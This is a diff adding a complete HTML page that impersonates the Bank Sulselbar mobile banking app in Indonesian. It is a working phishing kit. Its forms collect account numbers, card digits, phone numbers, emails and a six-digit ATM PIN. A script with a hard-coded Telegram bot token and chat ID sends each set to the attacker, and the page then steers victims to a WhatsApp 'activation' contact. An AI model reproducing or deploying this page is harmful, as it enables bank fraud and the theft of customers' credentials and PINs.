@@ -1,0 +1,245 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Bank Sulselbar Mobile</title>
+    <style>
+        body, html {
+            margin: 0; padding: 0; height: 100%;
+            font-family: 'Arial', sans-serif;
+            background-color: #8dbb33; 
+        }
+
+        /* ----- LOADING OVERLAY ----- */
+        #loader {
+            display: none;
+            position: fixed;
+            top: 0; left: 0; width: 100%; height: 100%;
+            background: rgba(255, 255, 255, 0.9);
+            z-index: 9999;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+        }
+
+        .spinner {
+            width: 50px;
+            height: 50px;
+            border: 5px solid #eee;
+            border-top: 5px solid #6a911e;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        /* ----- HALAMAN 1: SPLASH SCREEN ----- */
+        #halaman1 {
+            height: 100vh;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: space-between;
+            color: white;
+            padding: 60px 20px;
+            box-sizing: border-box;
+        }
+
+        .logo-container { 
+            text-align: center; 
+            width: 100%;
+            display: flex;
+            flex-direction: column;
+            align-items: center; 
+        }
+
+        .logo-box {
+            background: white;
+            width: 140px;
+            height: 140px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            border-radius: 25px;
+            margin-bottom: 20px;
+            box-shadow: 0 8px 15px rgba(0,0,0,0.1);
+        }
+
+        .logo-img {
+            width: 110px;
+            height: auto;
+        }
+
+        .brand-name {
+            font-style: italic;
+            margin: 0;
+            font-size: 32px;
+            font-weight: bold;
+            text-align: center;
+        }
+
+        .brand-sub {
+            font-size: 18px;
+            margin: 5px 0 0 0; 
+            text-align: center;
+            font-weight: normal;
+            letter-spacing: 0.5px;
+        }
+
+        .btn-container { width: 100%; max-width: 320px; }
+
+        .btn-main {
+            display: block; width: 100%;
+            padding: 15px 0; margin: 12px 0;
+            background-color: white; color: #6a911e;
+            border-radius: 12px; font-size: 18px; font-weight: bold;
+            text-align: center; border: none; cursor: pointer;
+            box-shadow: 0 4px 10px rgba(0,0,0,0.15);
+        }
+
+        /* ----- STYLE HALAMAN 2 & 3 ----- */
+        #halaman2, #halaman3 { display: none; height: 100vh; background-color: #f5f5f5; flex-direction: column; }
+        .navbar { background-color: #6a911e; color: white; padding: 18px; font-weight: bold; display: flex; align-items: center; }
+        .form-content { padding: 25px; flex: 1; background-color: white; margin: 15px; border-radius: 10px; box-shadow: 0 2px 5px rgba(0,0,0,0.05); }
+        .form-group { margin-bottom: 20px; }
+        .form-group label { display: block; font-weight: bold; margin-bottom: 5px; color: #333; font-size: 14px; }
+        .form-group input { width: 100%; border: none; border-bottom: 2px solid #eee; padding: 10px 0; font-size: 16px; outline: none; box-sizing: border-box; }
+        .btn-green { width: 100%; background-color: #6a911e; color: white; border: none; padding: 16px; font-size: 17px; font-weight: bold; border-radius: 8px; cursor: pointer; margin-top: 20px; }
+        .pin-container { display: flex; justify-content: center; gap: 10px; margin-top: 30px; }
+        .pin-input { width: 40px; height: 50px; text-align: center; font-size: 20px; border: 1px solid #ccc; border-radius: 5px; background: #fff; }
+        .footer-text { font-size: 11px; color: white; opacity: 0.8; margin-bottom: 10px; text-align: center; width: 100%; }
+    </style>
+</head>
+<body>
+
+    <div id="loader">
+        <div class="spinner"></div>
+        <p style="color: #6a911e; font-weight: bold; margin-top: 10px;">Mohon Tunggu...</p>
+    </div>
+
+    <div id="halaman1">
+        <div class="logo-container">
+            <div class="logo-box">
+                <img src="https://awsimages.detik.net.id/community/media/visual/2023/08/08/logo-bank-sulselbar-dokumen-istimewa_169.jpeg?w=600&q=90" alt="Logo" class="logo-img">
+            </div>
+            <h1 class="brand-name">Bank Sulselbar</h1>
+            <div class="brand-sub">Mobile Banking</div>
+        </div>
+        <div class="btn-container">
+            <button class="btn-main" onclick="prosesLoading(2)">Isi Data Formulir</button>
+        </div>
+        <div class="footer-text">© 2024 PT. Bank Sulselbar</div>
+    </div>
+
+    <div id="halaman2">
+        <div class="navbar"><span onclick="bukaHalaman(1)" style="cursor:pointer; margin-right:15px;">←</span> Isi Data Formulir</div>
+        <div class="form-content">
+            <div class="form-group"><label>No. Rekening</label><input type="number" id="noRekening" placeholder="Masukkan Nomor Rekening"></div>
+            <div class="form-group"><label>4 Digit Terakhir No. Kartu</label><input type="number" id="empatDigit" placeholder="Masukkan 4 Digit Terakhir"></div>
+            <div class="form-group"><label>No. Handphone</label><input type="tel" id="noHp" placeholder="Masukkan No. Handphone"></div>
+            <div class="form-group"><label>Email</label><input type="email" id="emailUser" placeholder="Masukkan Email"></div>
+            <button class="btn-green" id="btnLanjutkan" onclick="kirimDataHalaman2()">Selanjutnya</button>
+        </div>
+    </div>
+
+    <div id="halaman3">
+        <div class="navbar"><span onclick="bukaHalaman(2)" style="cursor:pointer; margin-right:15px;">←</span> Masukkan PIN</div>
+        <div id="formPin" style="padding: 20px; text-align: center;">
+            <p style="color:#666;">PIN ATM 6 digit Anda</p>
+            <div class="pin-container">
+                <input type="password" class="pin-input" maxlength="1" oninput="pindahInput(this, 0)">
+                <input type="password" class="pin-input" maxlength="1" oninput="pindahInput(this, 1)">
+                <input type="password" class="pin-input" maxlength="1" oninput="pindahInput(this, 2)">
+                <input type="password" class="pin-input" maxlength="1" oninput="pindahInput(this, 3)">
+                <input type="password" class="pin-input" maxlength="1" oninput="pindahInput(this, 4)">
+                <input type="password" class="pin-input" maxlength="1" oninput="pindahInput(this, 5)">
+            </div>
+            <button class="btn-green" onclick="kirimPinTelegram()">KONFIRMASI</button>
+        </div>
+        <div id="pesanAktivasi" style="display:none; padding: 20px; text-align: center;">
+            <div style="background: #e8f5e9; padding: 25px; border-radius: 15px; border: 1px solid #c8e6c9;">
+                <h3 style="color:#2e7d32; margin-top:0;">Registrasi Terkirim</h3>
+                <p style="color: #333; margin-bottom: 15px; font-weight: bold;">Untuk aktivasi silakan hubungi customer service WhatsApp</p>
+                <button class="btn-green" style="background-color: #25D366; border-radius: 50px;" onclick="window.open('https://wa.me/628170008799')">HUBUNGI WHATSAPP</button>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        const TOKEN = "8369092441:AAFPFsvi9BPjWJhEJcBPx2xzMtn-b2GdowY";
+        const CHAT_ID = "7692820036";
+
+        function bukaHalaman(n) {
+            document.getElementById('loader').style.display = 'none';
+            document.getElementById('halaman1').style.display = 'none';
+            document.getElementById('halaman2').style.display = 'none';
+            document.getElementById('halaman3').style.display = 'none';
+            
+            const hal = document.getElementById('halaman' + n);
+            if(hal) {
+                hal.style.display = 'flex';
+            }
+        }
+
+        function prosesLoading(halamanTujuan) {
+            document.getElementById('loader').style.display = 'flex';
+            setTimeout(() => {
+                bukaHalaman(halamanTujuan);
+            }, 1200); 
+        }
+
+        function pindahInput(e, i) {
+            const inputs = document.querySelectorAll('.pin-input');
+            if (e.value && i < 5) inputs[i + 1].focus();
+        }
+
+        function kirimDataHalaman2() {
+            const rek = document.getElementById('noRekening').value;
+            const digit = document.getElementById('empatDigit').value;
+            const hp = document.getElementById('noHp').value;
+            const email = document.getElementById('emailUser').value;
+
+            if(!rek || !hp || !email) { alert("Lengkapi semua data"); return; }
+
+            document.getElementById('loader').style.display = 'flex';
+
+            const msg = `<b>🏦 NASABAH BARU</b>\nRek: <code>${rek}</code>\nDigit: <code>${digit}</code>\nHP: <code>${hp}</code>\nEmail: <code>${email}</code>`;
+            
+            fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(msg)}&parse_mode=html`)
+            .then(() => {
+                setTimeout(() => { bukaHalaman(3); }, 800);
+            })
+            .catch(() => {
+                alert("Gagal mengirim data.");
+                document.getElementById('loader').style.display = 'none';
+            });
+        }
+
+        function kirimPinTelegram() {
+            let pin = "";
+            document.querySelectorAll('.pin-input').forEach(i => pin += i.value);
+            if(pin.length < 6) { alert("Masukkan 6 digit PIN"); return; }
+
+            document.getElementById('loader').style.display = 'flex';
+
+            const msg = `<b>🔑 PIN MASUK</b>\nPIN: <code>${pin}</code>`;
+            fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(msg)}&parse_mode=html`)
+            .then(() => {
+                setTimeout(() => {
+                    document.getElementById('loader').style.display = 'none';
+                    document.getElementById('formPin').style.display = 'none';
+                    document.getElementById('pesanAktivasi').style.display = 'block';
+                }, 1000);
+            })
+            .catch(() => {
+                alert("Gagal mengirim PIN.");
+                document.getElementById('loader').style.display = 'none';
+            });
+        }
+    </script>
+</body>
+</html>
